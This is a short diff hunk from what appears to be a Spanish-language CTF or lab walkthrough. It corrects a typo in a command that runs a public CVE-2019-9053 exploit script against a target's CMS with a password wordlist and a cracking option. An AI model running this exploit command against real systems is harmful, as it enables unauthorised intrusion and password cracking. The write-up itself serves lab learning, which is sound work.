@@ -73,7 +73,7 @@ https://github.com/e-renna/CVE-2019-9053
 
 fijamos la wordlist y corremos el script
 
-`python exploit.py -u http://io_objetivo/simple --crack -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best110.txt`
+`python exploit.py -u http://ip_objetivo/simple --crack -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best110.txt`
 
 **Nota**: *Corrí el script en vscode en entorno virtual, recibí muchos errores hasta q termino correctamente el proceso, Se debe ser paciente*
 
